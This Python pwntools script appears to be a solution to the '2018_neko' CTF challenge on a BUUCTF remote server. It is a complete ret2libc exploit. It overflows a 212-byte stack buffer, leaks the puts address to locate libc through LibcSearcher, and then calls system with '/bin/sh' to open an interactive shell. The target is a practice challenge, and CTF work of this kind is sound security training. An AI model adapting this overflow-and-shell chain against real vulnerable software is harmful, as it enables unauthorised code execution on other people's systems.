'''
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
'''

from pwn import *
from LibcSearcher import *


url, port = "node5.buuoj.cn", "26869" 
filename = "2018_neko"
elf = ELF(filename)
# libc = ELF("")
# context(arch="amd64", os="linux")
context(arch="i386", os="linux")

local = 0
if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

play_function_addr = 0x080486E7
system_addr = elf.plt['system']
puts_plt = elf.plt['puts']
# print('puts plt address: ', hex(puts_plt)) # 0x8048400
puts_got = elf.got['puts']
buffer_overflow_size = 208 + 4
appending_string = cyclic(buffer_overflow_size)

def B():
    gdb.attach(io)
    pause()


def pwn():
    io.recvuntil('Hey!Do you like cats?\n')
    io.sendline(b'y')
    io.recvuntil('Help this cat found his anchovies:\n')
    payload1 = appending_string + p32(puts_plt) + p32(play_function_addr) + p32(puts_got)
    io.sendline(payload1)
    
    io.recvuntil(b'\n')
    puts_addr = u32(io.recv(4))
    print('puts address: ', hex(puts_addr))
    # B()
    libc = LibcSearcher('puts', puts_addr)
    libc_base = puts_addr - libc.dump('puts') # libc6-i386_2.23-0ubuntu10_amd64
    binsh_addr = libc_base + libc.dump('str_bin_sh')
    
    io.recvuntil('Help this cat found his anchovies:\n')
    payload2 = appending_string + p32(system_addr) + p32(0) + p32(binsh_addr)
    io.sendline(payload2)


if __name__ == "__main__":
    pwn()
    io.interactive()
